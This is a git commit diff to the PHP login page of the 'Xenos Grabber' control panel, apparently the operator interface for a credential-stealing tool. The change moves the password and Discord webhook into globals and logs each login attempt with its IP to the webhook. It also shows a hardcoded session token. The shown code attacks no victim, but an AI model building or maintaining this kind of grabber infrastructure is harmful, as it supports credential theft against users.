6fc0710d84f5b53b31e838443689a32f4914886f
Pαrαdox <72992708+KanekiWeb@users.noreply.github.com>
2022-02-05 17:25:36 +0100

    🐺 Opti Code/Fix
    🐺

--- async/login.php
+++ async/login.php
@@ -1,18 +1,22 @@
 <?php
     require_once('../Inc/fonctions.php');
-    $webhook = "WEBHOOK FOR LOGS";
+    global $login_password, $logs_webhook;
 
     if(isset($_POST['password']) && !empty($_POST['password'])) {
-        if($_POST['password'] == "YOUR_SECRET_PASSWORD") {
-            $_SESSION['token'] = "n4wh0bhflr5z0v5s5l5q5lk1u1u3jm6eg3162atmey";
-            SendToWebhook($webhook, json_encode(["username" => "Xenos Grabber","avatar_url" => "https://kanekiweb.tk/assets/img/xenos.gif","embeds" => [["description" => "> __Tentative de connexion à Xenos Réussi:__\n```Password: " . $_POST['password'] . "```\nIp Adress: `".$_SERVER['REMOTE_ADDR']."`","footer" => ["text" => "Xenos Grabber - https://github.com/KanekiWeb","icon_url" => "https://kanekiweb.tk/assets/img/xenos.gif"]]]]));
+        if($_POST['password'] == $login_password) {
+            
+            $_SESSION['token'] = "n4wh0bhflr5z0v5s5l5q5lk1u1u3jm6eg3162atmey"; // Just for check if you are logged
+            SendToWebhook($logs_webhook, json_encode(["username" => "Xenos Grabber","avatar_url" => "https://kanekiweb.tk/assets/img/xenos.gif","embeds" => [["description" => "> __Tentative de connexion à Xenos Réussi:__\n```Password: " . $_POST['password'] . "```\nIp Adress: `".$_SERVER['REMOTE_ADDR']."`","footer" => ["text" => "Xenos Grabber - https://github.com/KanekiWeb","icon_url" => "https://kanekiweb.tk/assets/img/xenos.gif"]]]]));
             header('Location: ../'); die();
+
         } else {
-            SendToWebhook($webhook, json_encode(["username" => "Xenos Grabber","avatar_url" => "https://kanekiweb.tk/assets/img/xenos.gif","embeds" => [["description" => "> __Tentative de connexion à Xenos Echoué:__\n```Password: " . $_POST['password'] . "```\nIp Adress: `".$_SERVER['REMOTE_ADDR']."`","footer" => ["text" => "Xenos Grabber - https://github.com/KanekiWeb","icon_url" => "https://kanekiweb.tk/assets/img/xenos.gif"]]]]));
+            
+            SendToWebhook($logs_webhook, json_encode(["username" => "Xenos Grabber","avatar_url" => "https://kanekiweb.tk/assets/img/xenos.gif","embeds" => [["description" => "> __Tentative de connexion à Xenos Echoué:__\n```Password: " . $_POST['password'] . "```\nIp Adress: `".$_SERVER['REMOTE_ADDR']."`","footer" => ["text" => "Xenos Grabber - https://github.com/KanekiWeb","icon_url" => "https://kanekiweb.tk/assets/img/xenos.gif"]]]]));
             header('Location: ../login.php?error=invalid'); die();
         }
+        
     } else {
-        SendToWebhook($webhook, json_encode(["username" => "Xenos Grabber","avatar_url" => "https://kanekiweb.tk/assets/img/xenos.gif","embeds" => [["description" => "> __Tentative de connexion à Xenos Echoué:__\n```Password: " . $_POST['password'] . "```\nIp Adress: `".$_SERVER['REMOTE_ADDR']."`","footer" => ["text" => "Xenos Grabber - https://github.com/KanekiWeb","icon_url" => "https://kanekiweb.tk/assets/img/xenos.gif"]]]]));
+        SendToWebhook($logs_webhook, json_encode(["username" => "Xenos Grabber","avatar_url" => "https://kanekiweb.tk/assets/img/xenos.gif","embeds" => [["description" => "> __Tentative de connexion à Xenos Echoué:__\n```Password: " . $_POST['password'] . "```\nIp Adress: `".$_SERVER['REMOTE_ADDR']."`","footer" => ["text" => "Xenos Grabber - https://github.com/KanekiWeb","icon_url" => "https://kanekiweb.tk/assets/img/xenos.gif"]]]]));
         header('Location: ../login.php?error=invalid'); die();
     }
 
